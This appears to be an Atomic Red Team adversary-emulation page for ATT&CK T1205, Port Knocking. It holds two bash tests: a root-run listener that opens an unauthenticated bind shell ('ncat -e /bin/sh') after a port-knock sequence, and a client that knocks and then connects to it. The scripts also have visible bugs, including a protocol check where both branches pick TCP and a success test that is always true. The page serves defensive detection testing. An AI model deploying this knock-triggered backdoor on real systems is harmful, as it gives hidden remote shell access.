# T1205 - Port Knocking
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1205)
<blockquote>Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access. To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. 

This technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.

The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.</blockquote>

## Atomic Tests

- [Atomic Test #1 - Bind Shell After Sequence of Port Knocks - Server](#atomic-test-1---bind-shell-after-sequence-of-port-knocks---server)

- [Atomic Test #2 - Bind Shell After Sequence of Port Knocks - Client](#atomic-test-2---bind-shell-after-sequence-of-port-knocks---client)


<br/>

## Atomic Test #1 - Bind Shell After Sequence of Port Knocks - Server
Listen for a sequence of packets on specific ports for a specific protocol.  After the the sequence is received, create bind shell on a new listening port.

Note: This may be used in conjunction with the client.

**Supported Platforms:** Linux


#### Inputs
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| knock_protocol | Protocol for knock - tcp or udp | String | udp|
| knock_port_sequence | CSV of UDP ports that define a knock | String | 400004100040000420004000043000|
| listening_port | Port to start listening on after knock | String | 54321|
| max_listen_seconds | Maximum number of seconds to listen for sequence before stopping and to listen on opened port | Integer | 300|

#### Run it with `bash`!  Elevation Required (e.g. root or admin) 
```
TSHARK_FILTER=""
GREP_PATTERN=""
if [ "#{knock_protocol}" = "tcp" ] ; then
  PROTOCOL="tcp"
else
  PROTOCOL="tcp"
fi

for PORT in $(echo "#{knock_port_sequence}" | sed "s/,/ /g")
do
  if [ -z "$TSHARK_FILTER" ]
  then
    TSHARK_FILTER="($PROTOCOL dst port $PORT)"
    GREP_PATTERN="'$PORT'"
  else
    TSHARK_FILTER="$TSHARK_FILTER or ($PROTOCOL dst port $PORT)"
    GREP_PATTERN="$GREP_PATTERN(.*\n)*'$PORT'"
  fi
done
TSHARK_FILTER="($TSHARK_FILTER) and inbound"

echo -e "Listen for sequence for #{max_listen_seconds} seconds\n"
tshark -Q -l -n -f "$TSHARK_FILTER" -T fields -E quote=s -e $PROTOCOL.dstport -a duration:#{max_listen_seconds} > /tmp/t1205_server.dat 2> /dev/null & TSHARK_PID=$!

SEQUENCE_FOUND=false
COUNTER=0
while [ $COUNTER -lt #{max_listen_seconds} ]
do
  if grep -qPoz  "$GREP_PATTERN" /tmp/t1205_server.dat; then
    echo -e '\n\nSequence found...'
    SEQUENCE_FOUND=true
    kill $TSHARK_PID
    break
  fi
  sleep 1
done

if [ "$SEQUENCE_FOUND" = true ] ; then
  echo -e 'Start shell server; listen for up to #{max_listen_seconds} seconds\n\n'
  timeout #{max_listen_seconds}s ncat -nlp #{listening_port} -e /bin/sh
else
  echo 'Sequence not heard...'
fi
```


#### Cleanup Commands:
```
rm -f /tmp/t1205_server.dat
```

<br/>
<br/>

## Atomic Test #2 - Bind Shell After Sequence of Port Knocks - Client
Send a sequence of packets on specific ports for a specific protocol.  After the the sequence is send, attempt to connect to a bind shell on a new listening port.

Note: This may be used in conjunction with the server.

**Supported Platforms:** Linux


#### Inputs
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| server_ip | IP of server to knock | String | 127.0.0.1|
| knock_protocol | Protocol for knock - tcp or udp | String | udp|
| knock_port_sequence | CSV of UDP ports that define a knock | String | 400004100040000420004000043000|
| listening_port | Port the server will listen on after knock | String | 54321|

#### Run it with `bash`! 
```
SHELL_CONTACTED=false
for LOOP in {1..5} ;
do
  for PORT in $(echo "#{knock_port_sequence}" | sed "s/,/ /g")
  do
    if [ "#{knock_protocol}" = "udp" ] ; then
      echo -e "Knock\n" | ncat -u -w 1s #{server_ip} $PORT
    else
      echo -e "Knock\n" | ncat -w 1s #{server_ip} $PORT
    fi
    echo "Knock $PORT"
    sleep 0.5
  done
  echo -e "Anyone home?\n\n"

  sleep 2
  cat <(echo 'echo Shell to host $HOSTNAME as user $USER successful.'  && sleep 1) | ncat #{server_ip} #{listening_port} > /tmp/t1205_client.dat 2> /dev/null
  if [ -s /tmp/t1205_client.dat ] ; then
    SHELL_CONTACTED=true
    break
  else
    echo -e "Shell not there yet...\n\n"
  fi
done

if [ SHELL_CONTACTED ] ; then
  echo Shell successfully executed with port knock
  cat /tmp/t1205_client.dat
  exit 0
else
  echo Unable to bind shell with port knock
  exit 1
fi
```


#### Cleanup Commands:
```
rm -f /tmp/t1205_client.dat
```

<br/>
